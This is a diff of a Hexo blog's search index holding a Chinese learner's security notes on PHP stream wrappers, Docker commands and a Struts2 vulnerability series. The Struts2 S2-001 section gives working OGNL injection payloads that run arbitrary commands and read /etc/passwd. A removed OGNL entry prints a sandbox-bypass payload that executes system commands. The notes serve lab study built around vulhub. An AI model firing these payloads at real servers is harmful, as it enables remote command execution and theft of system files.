 </ol>
-<h2 id="0X01-PHP基础"><a href="#0X01-PHP基础" class="headerlink" title="0X01 PHP基础"></a>0X01 PHP基础</h2><p><strong>PHP标记</strong></p>
+<h2 id="0x01-PHP基础"><a href="#0x01-PHP基础" class="headerlink" title="0x01 PHP基础"></a>0x01 PHP基础</h2><p><strong>PHP标记</strong></p>
 <ul>
 <li>XML风格：起始标记：&lt;?php，结束标记：?&gt;</li>
 <li>脚本风格：&lt;script language=”php”&gt;phpinfo();&lt;/script&gt;</li>
@@ -3835,11 +4718,12 @@ pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre></li>
 <p><strong><strong>FILE</strong> 预定义变量</strong></p>
 <pre><code>echo __FILE__; #获取当前文件的完整路径</code></pre><p><strong>代码相关</strong></p>
 <pre><code>highlight_file(__FILE__); #显示当前的代码
-show_source(__FILE__); #显示当前的代码</code></pre><h2 id="0x02-PHP输出"><a href="#0x02-PHP输出" class="headerlink" title="0x02 PHP输出"></a>0x02 PHP输出</h2><ol>
-<li>echo、print、print_r、var_dump()、var_export()</li>
-</ol>
-<p>echo 输出一个或多个字符串，和 print 最主要的不同之处是， echo 接受参数列表，并且没有返回值。<br>print 输出字符串，和 echo 最主要的区别： print 仅支持一个参数，并总是返回 1<br>print_r()  以易于理解的格式打印变量。<br>var_dump() 打印变量的相关信息，此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br>var_export() 输出或返回一个变量的字符串表示，此函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的表示是合法的 PHP 代码。</p>
-<h2 id="0x03-目录相关"><a href="#0x03-目录相关" class="headerlink" title="0x03 目录相关"></a>0x03 目录相关</h2><p><strong>chdir(newdir) ——改变目录</strong></p>
+show_source(__FILE__); #显示当前的代码</code></pre><h2 id="0x02-PHP输出"><a href="#0x02-PHP输出" class="headerlink" title="0x02 PHP输出"></a>0x02 PHP输出</h2><p><strong>echo、print、print_r、var_dump()、var_export()</strong></p>
+<pre><code>echo 输出一个或多个字符串，和 print 最主要的不同之处是， echo 接受参数列表，并且没有返回值。
+print 输出字符串，和 echo 最主要的区别： print 仅支持一个参数，并总是返回 1
+print_r()  以易于理解的格式打印变量。
+var_dump() 打印变量的相关信息，此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。
+var_export() 输出或返回一个变量的字符串表示，此函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的表示是合法的 PHP 代码。</code></pre><h2 id="0x03-目录相关"><a href="#0x03-目录相关" class="headerlink" title="0x03 目录相关"></a>0x03 目录相关</h2><p><strong>chdir(newdir) ——改变目录</strong></p>
 <pre><code>&lt;?php
 echo getcwd().&quot;\n&quot;;
 chdir(&#39;/test&#39;);
@@ -3882,9 +4766,9 @@ echo disk_total_space(&#39;f:&#39;); #F盘</code></pre><p><strong>fclose() —�
 <pre><code>&lt;?php  
 echo file_exists(&#39;/var/&#39;); #1
 echo file_exists(&#39;/var/www/html/test1.php&#39;); #1
-echo file_exists(&#39;/var/www/html/test11.php&#39;); #存在即输出1，不存在不输出</code></pre><p><strong>file_get_contents() ——将整个文件读入一个字符串</strong></p>
+echo file_exists(&#39;/var/www/html/test11.php&#39;); #存在即输出1，不存在不输出</code></pre><p><strong>file_get_contents() ——读整个文件</strong></p>
 <pre><code>&lt;?php
-echo file_get_contents(&#39;./1.txt&#39;); </code></pre><p><strong>file_put_contents() ——将一个字符串写入文件</strong></p>
+echo file_get_contents(&#39;./1.txt&#39;); </code></pre><p><strong>file_put_contents() ——将字符串写入文件</strong></p>
 <pre><code>&lt;?php
 $file=&#39;./1.txt&#39;;  #file_get_contents
 $file_contents=file_get_contents($file);
@@ -4075,9 +4959,74 @@ while($row=mysql_fetch_array($result))
 echo &quot;&lt;br /&gt;&quot;;
 echo $query;
 mysql_close($connect);
-?&gt;</code></pre><h2 id="0x30-PHP支持的协议和封装协议"><a href="#0x30-PHP支持的协议和封装协议" class="headerlink" title="0x30 PHP支持的协议和封装协议"></a>0x30 PHP支持的协议和封装协议</h2><p><strong>file://</strong></p>
+?&gt;</code></pre><h2 id="0x30-PHP支持的协议和封装协议"><a href="#0x30-PHP支持的协议和封装协议" class="headerlink" title="0x30 PHP支持的协议和封装协议"></a>0x30 PHP支持的协议和封装协议</h2><p><strong>file:// ——访问本地文件</strong></p>
 <pre><code>&lt;?php
-print_r(file_get_contents(&#39;file://f:\\test\\1.txt&#39;,&#39;r&#39;));</code></pre><h2 id="0x40-PHP运算符"><a href="#0x40-PHP运算符" class="headerlink" title="0x40 PHP运算符"></a>0x40 PHP运算符</h2><h3 id="0x41-比较运算符"><a href="#0x41-比较运算符" class="headerlink" title="0x41 比较运算符"></a>0x41 比较运算符</h3><ol>
+print_r(file_get_contents(&#39;file://f:\\test\\1.txt&#39;,&#39;r&#39;));</code></pre><p><strong>http(s):// ——访问http(s)网址</strong></p>
+<pre><code>&lt;?php
+$http_fopen=fopen(&#39;http://127.0.0.1/phpinfo.php&#39;,&#39;r&#39;);
+$meta_data=stream_get_meta_data($http_fopen);
+print_r($meta_data);
+print_r($meta_data[&#39;wrapper_data&#39;]);</code></pre><p><strong>ftp(s):// ——访问FTP(s)URLs</strong></p>
+<pre><code>ftp://example.com/pub/file.txt
+ftp://user:password@example.com/pub/file.txt
+ftps://example.com/pub/file.txt
+ftps://user:password@example.com/pub/file.txt</code></pre><p><strong>php:// ——访问各个输入、输出流</strong></p>
+<pre><code>允许访问 PHP 的输入输出流、标准输入输出和错误描述符
+php://stdin、php://stdout、php://stderr
+php://stdin 是只读的， php://stdout 和 php://stderr 是只写的。
+php://input 是个可以访问请求的原始数据的只读流。
+php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。
+php://fd 允许直接访问指定的文件描述符。
+php://memory 和 php://temp 是一个类似文件 包装器的数据流，允许读写临时数据。 
+php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。
+
+php.ini默认配置
+allow_url_fopen = On
+allow_url_include = Off</code></pre><pre><code>&lt;?php 
+while($line=fopen(&#39;php://stdin&#39;,&#39;r&#39;)){
+    echo fgets($line);
+}</code></pre><p><img src="/PHP%E5%AD%A6%E4%B9%A0/5.png" alt></p>
+<pre><code>&lt;?php 
+readfile(&quot;php://filter/resource=http://127.0.0.1&quot;);  //php://filter/resource=&lt;待过滤的数据流&gt;
+readfile(&quot;php://filter/read=string.toupper/resource=http://127.0.0.1&quot;);  //php://filter/read=&lt;读链需要应用的过滤器列表&gt;，以大写字母输出
+readfile(&quot;php://filter/read=string.toupper|string.rot13/resource=http://127.0.0.1&quot;);  //php://filter/read=&lt;读链需要应用的过滤器列表&gt;，以大写字母输出且用 ROT13 加密
+file_put_contents(&quot;php://filter/write=string.rot13/resource=example.txt&quot;,&quot;Hello World&quot;);  //php://filter/write=&lt;写链需要应用的过滤器列表&gt;，写入到文件且用 ROT13 加密</code></pre><p><img src="/PHP%E5%AD%A6%E4%B9%A0/6.png" alt><br><img src="/PHP%E5%AD%A6%E4%B9%A0/7.png" alt></p>
+<p><strong>zlib:// bzip:// zip:// ——压缩流</strong></p>
+<pre><code>#压缩文件1.zip(文件1.txt(内容123456))
+
+&lt;?php 
+$fp=fopen(&#39;zip://./1.zip#1.txt&#39;,&#39;r&#39;);
+if($fp){
+    while(!feof($fp)){
+        echo fread($fp, 1024);
+    }
+    fclose($fp);
+}
+
+其他选项
+compress.zlib://file.gz
+compress.bzip2://file.bz2
+zip://archive.zip#dir/file.txt</code></pre><p><strong>data:// ——数据（RFC 2397）</strong></p>
+<pre><code>data://text/plain;base64
+
+&lt;?php 
+echo file_get_contents(&#39;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#39;); #I love PHP</code></pre><p><strong>glob:// ——查找匹配的文件路径模式</strong></p>
+<pre><code>&lt;?php 
+$all_file=new DirectoryIterator(&quot;glob://f:\\test\\*.*&quot;);
+foreach ($all_file as $f) {
+    printf(&quot;%s: %.1FK\n&quot;,$f-&gt;getFilename(),$f-&gt;getsize()/1024);
+}</code></pre><p><img src="/PHP%E5%AD%A6%E4%B9%A0/8.png" alt></p>
+<p><strong>phar:// ——PHP 归档</strong><br><a href="https://xz.aliyun.com/t/2715" target="_blank" rel="noopener">https://xz.aliyun.com/t/2715</a></p>
+<p><strong>ssh2:// ——Secure Shell 2</strong></p>
+<pre><code>ssh2.shell://user:pass@example.com:22/xterm
+ssh2.exec://user:pass@example.com:22/usr/local/bin/somecmd
+ssh2.tunnel://user:pass@example.com:22/192.168.0.1:14
+ssh2.sftp://user:pass@example.com:22/path/to/filename</code></pre><p><strong>rar:// ——RAR</strong></p>
+<pre><code>rar://&lt;url encoded archive name&gt;[*][#[&lt;url encoded entry name&gt;]]</code></pre><p><strong>ogg:// ——音频流</strong></p>
+<pre><code>ogg://soundfile.ogg
+ogg:///path/to/soundfile.ogg
+ogg://http://www.example.com/path/to/soundstream.ogg</code></pre><p><strong>expect:// ——处理交互式的流</strong></p>
+<pre><code>expect://command</code></pre><h2 id="0x40-PHP运算符"><a href="#0x40-PHP运算符" class="headerlink" title="0x40 PHP运算符"></a>0x40 PHP运算符</h2><h3 id="0x41-比较运算符"><a href="#0x41-比较运算符" class="headerlink" title="0x41 比较运算符"></a>0x41 比较运算符</h3><ol>
 <li><a href="https://www.php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">PHP比较运算符</a></li>
 <li><a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">PHP类型比较表</a></li>
 </ol>
@@ -4089,92 +5038,6 @@ print_r(file_get_contents(&#39;file://f:\\test\\1.txt&#39;,&#39;r&#39;));</code>
       <tags>
         <tag>知识</tag>
         <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF与wireshark</title>
-    <url>/CTF%E4%B8%8Ewireshark/</url>
-    <content><![CDATA[<h2 id="0x00-Wireshark"><a href="#0x00-Wireshark" class="headerlink" title="0x00 Wireshark"></a>0x00 Wireshark</h2><ol>
-<li><img src="/CTF%E4%B8%8Ewireshark/1.jfif" alt></li>
-<li>wireshark的基本作用：数据包抓取、数据包筛选、关键词搜索、数据包还原、数据包提取。</li>
-</ol>
-<h2 id="0x01-数据包筛选"><a href="#0x01-数据包筛选" class="headerlink" title="0x01 数据包筛选"></a>0x01 数据包筛选</h2><ol>
-<li><strong>ip筛选</strong></li>
-<li>ip.src==ip地址  #源ip地址筛选</li>
-<li>ip.dst==ip地址  #目标ip地址筛选</li>
-<li></li>
-<li><strong>mac筛选</strong></li>
-<li>eth.addr==MAC地址  #mac地址筛选</li>
-<li>eth.dst==MAC地址  #目标mac地址筛选</li>
-<li></li>
-<li><strong>端口筛选</strong></li>
-<li>tcp.srcport==80 #筛选tcp协议源端口为80的流量包</li>
-<li>tcp.dstport==80 #筛选tcp协议目的端口为80的流量包</li>
-<li>udp.srcport==80 #筛选udp协议源端口为80的流量包</li>
-<li>tcp.port==8080 #</li>
-<li>udp.port eq 80 #</li>
-<li>tcp.port&gt;=1 and tcp.port&lt;=10000 #</li>
-<li></li>
-<li><strong>协议筛选</strong></li>
-<li>tcp</li>
-<li>udp</li>
-<li>arp</li>
-<li>icmp</li>
-<li>http</li>
-<li>ftp</li>
-<li>dns</li>
-<li>ip</li>
-<li></li>
-<li><strong>关系筛选</strong></li>
-<li>eq ==</li>
-<li>ne !=</li>
-<li>gt &gt;</li>
-<li>lt &lt;</li>
-<li>ge &gt;=</li>
-<li>le &lt;=</li>
-<li>contains #包含</li>
-<li>matches #匹配给定的表达式</li>
-<li></li>
-<li><strong>包长度筛选</strong></li>
-<li>tcp.length==100 #筛选长度为100的tcp流量包</li>
-<li>udp.len&gt;=100 #筛选长度大于100的udp流量包</li>
-<li>ip.len==100 #筛选长度为100的ip流量包</li>
-<li>frame.len==100 #筛选长度为100的整个流量包</li>
-<li></li>
-<li><strong>http请求筛选</strong></li>
-<li>http.request.method==GET #筛选http请求方法为GET的流量包</li>
-<li>http.request.method==POST #筛选http请求方法为POST的流量包</li>
-<li>http.request.uri==”/dir/1.gif” #筛选url为/dir/1.gif的流量包</li>
-<li>http contains “flag”</li>
-</ol>
-<h2 id="0x02-关键字搜索"><a href="#0x02-关键字搜索" class="headerlink" title="0x02 关键字搜索"></a>0x02 关键字搜索</h2><ol>
-<li>关键字搜索，快捷键ctrl+f</li>
-<li><img src="/CTF%E4%B8%8Ewireshark/1.png" alt></li>
-</ol>
-<h2 id="0x03-数据流追踪"><a href="#0x03-数据流追踪" class="headerlink" title="0x03 数据流追踪"></a>0x03 数据流追踪</h2><ol>
-<li>右击目的数据包——追踪流——TCP流/UDP流/SSL流/HTTP流</li>
-<li><img src="/CTF%E4%B8%8Ewireshark/2.png" alt></li>
-</ol>
-<h2 id="0x04-数据提取"><a href="#0x04-数据提取" class="headerlink" title="0x04 数据提取"></a>0x04 数据提取</h2><ol>
-<li>wireshark支持提权通过http传输（上传/下载）的文件内容</li>
-<li>文件——导出对象——HTTP等</li>
-<li><img src="/CTF%E4%B8%8Ewireshark/3.png" alt></li>
-<li>还可以 文件——导出分组字节流</li>
-</ol>
-<h2 id="0x05-搜索流量包中的关键字"><a href="#0x05-搜索流量包中的关键字" class="headerlink" title="0x05 搜索流量包中的关键字"></a>0x05 搜索流量包中的关键字</h2><ol>
-<li>直接记事本打开流量包，搜索关键字，如flag、ctf等等</li>
-</ol>
-<h2 id="0x06-统计"><a href="#0x06-统计" class="headerlink" title="0x06 统计"></a>0x06 统计</h2><ol>
-<li>统计——协议分级——查看当前数据包中包含哪些协议</li>
-<li><img src="/CTF%E4%B8%8Ewireshark/4.png" alt></li>
-</ol>
-<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
-<li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>知识</tag>
       </tags>
   </entry>
   <entry>
@@ -5595,139 +6458,6 @@ file.close()</code></pre></li>
       </tags>
   </entry>
   <entry>
-    <title>OGNL表达式</title>
-    <url>/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
-    <content><![CDATA[<h2 id="0x00-OGNL"><a href="#0x00-OGNL" class="headerlink" title="0x00 OGNL"></a>0x00 OGNL</h2><ol>
-<li>OGNL（Object Graph Navigation Language）即对象图形导航语言，是应用于Java中的一个开源的表达式语言（Expression Language，简称EL），它被集成在Struts2等框架中，作用是对数据进行访问，它拥有类型转换、访问对象方法、操作集合对象等功能。</li>
-<li>对于用户输入的参数存取处理api都在ognl.java中，分别由getvalue和setvalue两个函数实现。</li>
-</ol>
-<h2 id="0x01-OGNL三要素"><a href="#0x01-OGNL三要素" class="headerlink" title="0x01 OGNL三要素"></a>0x01 OGNL三要素</h2><ol>
-<li>Context对象：即OGNL的上下文环境，是OGNL的核心。</li>
-<li>root对象：OGNL的操作对象，表达式规定做什么，root对象就指定对谁操作。</li>
-<li>表达式（Expression）：OGNL表达式是功能强大的表达式语言，在OGNL中做任何操作（取值、赋值、调用方法等等），都要表达式表示。</li>
-</ol>
-<p><strong>User对象：User.java</strong></p>
-<pre><code>public class User{
-    private String name;
-    private Integer age;
-    public User(){
-        super();
-    }
-}
-public User(){
-    super();
-    this.name=name;
-    this.age=age;
-}
-public String getName(){
-    return name;
-}
-public void setName(String name){
-    this.name=name;
-}
-public Integer getAge(){
-    return age;
-}
-public void setAge(Integer age){
-    this.age=age;
-}
-</code></pre><p><strong>User对象，root的方式</strong></p>
-<pre><code>User rootUser=new User(&quot;test&quot;,11);</code></pre><p><strong>Context的方式</strong></p>
-<pre><code>Map&lt;String,User&gt; context=new HashMap&lt;String,User&gt;();
-context.put(&quot;user1&quot;,new User(&quot;aaa&quot;,22));
-context.put(&quot;user2&quot;,new User(&quot;bbb&quot;,33));</code></pre><p><strong>创建OGNL Context对象</strong></p>
-<pre><code>OgnlContext oc=new OgnlContext();
-oc.setRoot(rootUser);
-oc.setValues(context);</code></pre><p><strong>获取root中的User对象的name和age属性</strong></p>
-<pre><code>String name=(String) Ognl.getValue(&quot;name&quot;,oc,oc.getRoot());
-String age=(Integer) Ognl.getValue(&quot;age&quot;,oc,oc.getRoot());
-System.out.println(name);
-System.out.println(age);</code></pre><p><strong>获取Context对象中的属性值</strong>，要加上#符号</p>
-<pre><code>String name1=(String) Ognl.getValue(&quot;#user1.name&quot;,oc,oc.getRoot());
-String name2=(String) Ognl.getValue(&quot;#user2.name&quot;,oc,oc.getRoot());
-Integer age1=(Integer) Ognl.getValue(&quot;#user1.age&quot;,oc,oc.getRoot());
-Integer age2=(Integer) Ognl.getValue(&quot;#user2.age&quot;,oc,oc.getRoot());
-System.out.println(name1);
-System.out.println(name2);
-System.out.println(age1);
-System.out.println(age2);</code></pre><p><strong>为root中的user对象的name属性赋值</strong></p>
-<pre><code>Ognl.getValue(&quot;name=&#39;ccc&#39;&quot;,oc,oc.getRoot());
-String name=(String) Ognl.getValue(&quot;name&quot;,oc,oc.getRoot());
-System.out.println(name);</code></pre><p><strong>为Context中的user1对象的name属性赋值</strong></p>
-<pre><code>Ognl.getValue(&quot;#user1.name=&#39;ddd&#39;&quot;,oc,oc.getRoot());
-String name1=(String) Ognl.getValue(&quot;#user1.name&quot;,oc,oc.getRoot());
-System.out.println(name1);</code></pre><p><strong>getValue获取OGNL表达式运行后的值</strong></p>
-<pre><code>public static java.lang.Object getValue(
-java.lang.String expression, #表达式
-java.util.Map context, #上下文
-java.lang.Object root, #表达式根对象
-java.lang.Class resultType) #被转换的结果对象的类型
-throws OgnlException</code></pre><ol>
-<li>OGNL 的 API 设计得是很简单的，context 提供上下文，为变量和表达式的求值过程来提供命名空间，存储变量 等，通过 root 来指定对象图遍历的初始变量，使用 expression 来告诉 Ognl 如何完成运算。</li>
-</ol>
-<h2 id="0x02-Struts标签"><a href="#0x02-Struts标签" class="headerlink" title="0x02 Struts标签"></a>0x02 Struts标签</h2><ol>
-<li>&lt;%@taglib prefix=”s” uri=”/struts-tags” %&gt;</li>
-<li>使用标签获取取值，取值的时候要注意根元素（全局变量）不用#号，其他的都用#号。</li>
-</ol>
-<h2 id="0x03-OGNL的命令执行"><a href="#0x03-OGNL的命令执行" class="headerlink" title="0x03 OGNL的命令执行"></a>0x03 OGNL的命令执行</h2><p><strong>java的命令执行：java.lang.Runtime类的getRuntime方法</strong></p>
-<pre><code>import java.io.IOException;
-import static java.lang.Runtime.getRuntime;
-public class Run{
-    public static void main(String[] args)throws IOException{
-        Process=getRuntime().exec(&quot;calc&quot;);
-    }
-}</code></pre><p><strong>OGNL实现</strong></p>
-<pre><code>import ognl.Ognl;
-import ognl.OgnlContext;
-import ognl.OgnlException;
-public class Ognltest{
-    public static void main(String[] args)thros IOExceptions{
-        OgnlContext context=new OgnlContext();
-        Object obj=Ognl.getValue(&quot;@java.lang.Runtime@getRuntime().exe(&#39;calc&#39;)&quot;.context);
-    }
-}</code></pre><h2 id="0x04-沙盒"><a href="#0x04-沙盒" class="headerlink" title="0x04 沙盒"></a>0x04 沙盒</h2><ol>
-<li>禁止了静态方法的调用</li>
-<li><strong>allowStaticMethodAcces</strong> 和 <strong>MethodAccessor.denyMethodExecution</strong></li>
-<li>xwork.MethodAccessor.denyMethodExecution设置为false</li>
-<li>allowStaticMethodAccess设置为true</li>
-</ol>
-<pre><code>&lt;struts&gt;
-　　&lt;!-- 开启静态方法访问常量 --&gt;
-　　&lt;constant name=&quot;struts.ognl.allowStaticMethodAccess&quot; value=&quot;true&quot;&gt;&lt;/constant&gt;
-　　&lt;package name=&quot;struts&quot; extends=&quot;struts-default&quot;&gt;&lt;/package&gt;
-&lt;/struts&gt;</code></pre><ol>
-<li>#_memberAccess[&#39;allowStaticMethodAccess&#39;]’)(meh)=true&amp;(aaa)((‘\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003d\u0023foo’)(\u0023foo\u003dnew%20java.lang.Boolean(“false”)))</li>
-<li>上面绕过了两个安全机制参数的限制（修改了安全机制参数的值）</li>
-<li>URL编码</li>
-<li>\u0023_memberAccess[&#39;allowStaticMethodAccess&#39;]’)(meh)=true&amp;(aaa)((‘\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003d\u0023foo’)(\u0023foo\u003dnew%20java.lang.Boolean(“false”)))&amp;(asdf)</li>
-<li>payload:</li>
-<li>(‘\u0023_memberAccess[&#39;allowStaticMethodAccess&#39;]’)(meh)=true&amp;(aaa)((‘\u0023context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]\u003d\u0023foo’)(\u0023foo\u003dnew%20java.lang.Boolean(“false”)))&amp;(asdf)((‘\u0023rt.exec(‘ipconfig’)’)(\u0023rt[email]<a href="mailto:u003d@java.lang.Runt" target="_blank" rel="noopener">u003d@java.lang.Runt</a>[/email]ime@getRuntime()))=1</li>
-</ol>
-<p><strong>payload中开启</strong></p>
-<ol>
-<li>#_memberAccess[“allowStaticMethodAccess”]=true // 用来授权允许调用静态方法</li>
-<li>创建ProcessBuilder对象来执行命令</li>
-<li>new java.lang.ProcessBuilder(new java.lang.String[]{‘cat’,’/etc/passwd’})).start()</li>
-</ol>
-<h2 id="0x05-项目支持"><a href="#0x05-项目支持" class="headerlink" title="0x05 项目支持"></a>0x05 项目支持</h2><ol>
-<li>WebWork</li>
-<li>Struts2</li>
-<li>Tapestry(4.0或之前)</li>
-<li>Spring Web Flow</li>
-<li>Apache Click</li>
-<li>MyBatis- SQL映射框架</li>
-<li>Thymeleaf- 一个Java XML / XHTML / HTML5 模板引擎</li>
-<li>FreeMarker- 一个Java模板引擎</li>
-</ol>
-<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
-<li><a href="https://www.freebuf.com/column/181718.html" target="_blank" rel="noopener">https://www.freebuf.com/column/181718.html</a></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>知识</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>docker使用</title>
     <url>/docker%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h2 id="0x00-docker准备"><a href="#0x00-docker准备" class="headerlink" title="0x00 docker准备"></a>0x00 docker准备</h2><ol>
@@ -5752,7 +6482,7 @@ public class Ognltest{
 <li>docker run -t -i ubuntu:14.04 /bin/bash #使用ubuntu14.04版本镜像运行容器，-t：终端，-i：交互式操作，/bin/bash：使用的shell</li>
 <li>docker search ubuntu:14.04 #查看镜像</li>
 <li>NAME：镜像仓库源的名称，DESCRIPTION: 镜像的描述，stars: 类似 Github 里面的 star，OFFICIAL: 是否 docker 官方发布，AUTOMATED: 自动构建</li>
-<li>docker rmi NAME #删除镜像</li>
+<li>docker rmi [REPOSITORY] #删除镜像</li>
 <li>docker tag ID XXX #设置镜像标签</li>
 </ol>
 <h3 id="0x21-构建镜像"><a href="#0x21-构建镜像" class="headerlink" title="0x21 构建镜像"></a>0x21 构建镜像</h3><ol>
@@ -5777,6 +6507,11 @@ public class Ognltest{
 <li>docker rm ID/NAME #删除web应用容器，但必须先停止容器</li>
 <li>docker rm -f ID/NAME #-f：强制删除容器</li>
 <li>docker container prune #清除已停止状态的容器</li>
+<li></li>
+<li>docker start $(docker ps -a | awk ‘{print $1}’ | tail -n +2) #批量启动容器</li>
+<li>docker stop $(docker ps -a | awk ‘{print $1}’ | tail -n +2) #批量关闭容器</li>
+<li></li>
+<li>docker rm $(docker ps -a | awk ‘{print $1}’ | tail -n +2) #批量删除容器</li>
 </ol>
 <h2 id="0x40-运行web应用"><a href="#0x40-运行web应用" class="headerlink" title="0x40 运行web应用"></a>0x40 运行web应用</h2><ol>
 <li>docker pull training/webapp #载入镜像</li>
@@ -5799,8 +6534,8 @@ public class Ognltest{
       </tags>
   </entry>
   <entry>
-    <title>Struts2漏洞序列</title>
-    <url>/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/</url>
+    <title>Struts2漏洞系列</title>
+    <url>/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><h2 id="0x10-S2-001信息"><a href="#0x10-S2-001信息" class="headerlink" title="0x10 S2-001信息"></a>0x10 S2-001信息</h2><ol>
 <li>官方链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></li>
 <li>影响版本：WebWork 2.1（启用altSyntax），WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8</li>
@@ -5816,25 +6551,25 @@ public class Ognltest{
 <li>进入vulhub对应的漏洞目录，建立测试环境</li>
 <li>docker-compose up -d 或者 docker-compose build</li>
 <li>浏览器访问</li>
-<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/2.png" alt></li>
+<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/2.png" alt></li>
 <li>列出镜像</li>
 <li>docker images</li>
-<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/1.png" alt></li>
+<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/1.png" alt></li>
 <li>关闭环境</li>
 <li>docker-compose down</li>
 </ol>
 <h2 id="0x11-漏洞利用与payload（需要url编码）"><a href="#0x11-漏洞利用与payload（需要url编码）" class="headerlink" title="0x11 漏洞利用与payload（需要url编码）"></a>0x11 漏洞利用与payload（需要url编码）</h2><ol>
 <li>获取tomcat执行路径：<pre><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code></pre></li>
-<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/3.png" alt></li>
+<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/3.png" alt></li>
 <li></li>
 <li>获取Web路径<pre><code>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()}</code></pre></li>
-<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/4.png" alt></li>
+<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/4.png" alt></li>
 <li></li>
 <li>执行任意命令（命令加参数：new java.lang.String[]{“cat”,”/etc/passwd”}）<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;pwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre></li>
-<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/5.png" alt></li>
-<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/6.png" alt></li>
+<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/5.png" alt></li>
+<li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/6.png" alt></li>
 </ol>
-<h2 id="0x12-官方修复"><a href="#0x12-官方修复" class="headerlink" title="0x12 官方修复"></a>0x12 官方修复</h2><p><img src="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97/7.png" alt></p>
+<h2 id="0x12-官方修复"><a href="#0x12-官方修复" class="headerlink" title="0x12 官方修复"></a>0x12 官方修复</h2><p><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/7.png" alt></p>
 <ol>
 <li>XWork 2.0.4中，改变了ognl表达式的解析方法从而不会产生递归解析，用户的输入也不会再解析执行。</li>
 <li>因为解析一层表达式后，loopCount &gt; maxLoopCount，直接执行break，不再解析用户的恶意代码。</li>
@@ -5854,7 +6589,7 @@ public class Ognltest{
 <h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
 <li><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></li>
 </ol>
-<h2 id="Struts2序列漏洞——OGNL注入表达式"><a href="#Struts2序列漏洞——OGNL注入表达式" class="headerlink" title="Struts2序列漏洞——OGNL注入表达式"></a>Struts2序列漏洞——OGNL注入表达式</h2><ol>
+<h2 id="Struts2系列漏洞——OGNL注入表达式"><a href="#Struts2系列漏洞——OGNL注入表达式" class="headerlink" title="Struts2系列漏洞——OGNL注入表达式"></a>Struts2系列漏洞——OGNL注入表达式</h2><ol>
 <li>漏洞编号：S2-001、S2-003、S2-005、S2-007、S2-009、S2-012、S2-013、S2-015、S2-016、S2-019、S2-029、S2-032、S2-033、S2-037、S2-045、S2-046、S2-048、S2-052</li>
 <li>request参数名、cookie名：(ognl)(constant)=value&amp;(constant)((ognl1)(ognl2))（S2-003、S2-005）</li>
 <li>request参数值：%{ognl}、${ognl}、(ognl)、’ognl’（S2-007、S2-009、S2-012）</li>
@@ -5882,6 +6617,7 @@ public class Ognltest{
 ]]></content>
       <tags>
